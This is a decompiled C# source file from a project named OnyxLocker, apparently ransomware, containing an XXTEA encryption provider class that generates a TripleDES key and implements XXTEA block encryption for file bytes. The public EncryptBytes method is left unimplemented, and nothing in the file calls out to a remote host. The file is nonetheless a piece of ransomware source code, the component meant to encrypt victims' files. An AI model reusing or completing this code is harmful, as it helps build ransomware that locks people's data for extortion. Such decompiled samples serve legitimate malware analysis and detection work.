using System;
using System.Security.Cryptography;
using System.Text;

namespace OnyxLocker.Classes
{
	// Token: 0x0200000D RID: 13
	internal class XxteaEncryptionProvider : IEncryptionProvider
	{
		// Token: 0x17000008 RID: 8
		// (get) Token: 0x06000028 RID: 40 RVA: 0x00002B1C File Offset: 0x00000D1C
		// (set) Token: 0x06000029 RID: 41 RVA: 0x00002B24 File Offset: 0x00000D24
		private byte[] EncryptionKey { get; set; }

		// Token: 0x0600002A RID: 42 RVA: 0x00002B30 File Offset: 0x00000D30
		public byte[] CreateEncryptionKey()
		{
			TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
			tripleDESCryptoServiceProvider.KeySize = 192;
			tripleDESCryptoServiceProvider.GenerateKey();
			byte[] key = tripleDESCryptoServiceProvider.Key;
			tripleDESCryptoServiceProvider.Dispose();
			this.EncryptionKey = key;
			return key;
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00002B74 File Offset: 0x00000D74
		public byte[] GetEncryptionKey()
		{
			return this.EncryptionKey;
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00002B8C File Offset: 0x00000D8C
		public byte[] EncryptBytes(byte[] fileBytes, byte[] encryptionKey)
		{
			throw new NotImplementedException();
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00002B94 File Offset: 0x00000D94
		private uint MX(uint sum, uint y, uint z, int p, uint e, uint[] k)
		{
			return (z >> 5 ^ y << 2) + (y >> 3 ^ z << 4) ^ (sum ^ y) + (k[(int)(checked((IntPtr)(unchecked((long)(p & 3) ^ (long)((ulong)e)))))] ^ z);
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00002BCC File Offset: 0x00000DCC
		private byte[] Encrypt(byte[] data, byte[] key)
		{
			bool flag = data.Length == 0;
			byte[] result;
			if (flag)
			{
				result = data;
			}
			else
			{
				result = this.ToByteArray(this.Encrypt(this.ToUInt32Array(data, true), this.ToUInt32Array(this.FixKey(key), false)), false);
			}
			return result;
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00002C10 File Offset: 0x00000E10
		private uint[] Encrypt(uint[] v, uint[] k)
		{
			int num = v.Length - 1;
			bool flag = num < 1;
			uint[] result;
			if (flag)
			{
				result = v;
			}
			else
			{
				uint z = v[num];
				uint num2 = 0U;
				int num3 = 6 + 52 / (num + 1);
				while (0 < num3--)
				{
					num2 += 2654435769U;
					uint e = num2 >> 2 & 3U;
					int i;
					uint y;
					for (i = 0; i < num; i++)
					{
						y = v[i + 1];
						z = (v[i] += this.MX(num2, y, z, i, e, k));
					}
					y = v[0];
					z = (v[num] += this.MX(num2, y, z, i, e, k));
				}
				result = v;
			}
			return result;
		}

		// Token: 0x06000030 RID: 48 RVA: 0x00002CD8 File Offset: 0x00000ED8
		private byte[] FixKey(byte[] key)
		{
			bool flag = key.Length == 16;
			byte[] result;
			if (flag)
			{
				result = key;
			}
			else
			{
				byte[] array = new byte[16];
				bool flag2 = key.Length < 16;
				if (flag2)
				{
					key.CopyTo(array, 0);
				}
				else
				{
					Array.Copy(key, 0, array, 0, 16);
				}
				result = array;
			}
			return result;
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00002D28 File Offset: 0x00000F28
		private uint[] ToUInt32Array(byte[] data, bool includeLength)
		{
			int num = data.Length;
			int num2 = ((num & 3) == 0) ? (num >> 2) : ((num >> 2) + 1);
			uint[] array;
			if (includeLength)
			{
				array = new uint[num2 + 1];
				array[num2] = (uint)num;
			}
			else
			{
				array = new uint[num2];
			}
			for (int i = 0; i < num; i++)
			{
				array[i >> 2] |= (uint)((uint)data[i] << ((i & 3) << 3));
			}
			return array;
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00002DA4 File Offset: 0x00000FA4
		private byte[] ToByteArray(uint[] data, bool includeLength)
		{
			int num = data.Length << 2;
			if (includeLength)
			{
				int num2 = (int)data[data.Length - 1];
				num -= 4;
				bool flag = num2 < num - 3 || num2 > num;
				if (flag)
				{
					return null;
				}
				num = num2;
			}
			byte[] array = new byte[num];
			for (int i = 0; i < num; i++)
			{
				array[i] = (byte)(data[i >> 2] >> ((i & 3) << 3));
			}
			return array;
		}

		// Token: 0x0400000B RID: 11
		private readonly UTF8Encoding utf8 = new UTF8Encoding();

		// Token: 0x0400000D RID: 13
		private const uint delta = 2654435769U;
	}
}
